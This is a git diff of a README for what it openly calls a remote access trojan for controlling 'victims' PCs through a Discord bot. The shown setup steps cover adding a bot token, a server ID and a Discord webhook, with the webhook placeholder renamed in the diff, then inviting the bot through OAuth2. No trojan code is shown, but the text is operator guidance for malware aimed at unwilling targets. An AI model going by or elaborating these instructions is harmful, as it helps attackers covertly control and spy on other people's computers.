@@ -20,6 +20,6 @@ Cool remote access trojan to control victims pc via discord bot. No port forward
      - Replace `BOT_TOKE_HERE` with your bot token that you got from the [developer page](https://discord.com/developers)
        - go to where it says `g = [GUILDIDHERE]` (line 57)
          - Replace `GUILD_ID_HERE` with the id of your server that you want the bot to be in ([server id?](https://support.discord.com/hc/en-us/articles/206346498-Where-can-I-find-my-User-Server-Message-ID))
-          - Replace `WEBHOOKHERE` with a discoord webook
+          - Replace `WEBHOOKLINKHERE` with a discoord webook
 6. Now your ready to invite your bot to your server, go to the the [developer page](https://discord.com/developers) and go to the page `OAuth2` and enable these options
 <img alt="OAuth2" src="https://cdn.discordapp.com/attachments/905814376043401249/906199066965336094/unknown.png">
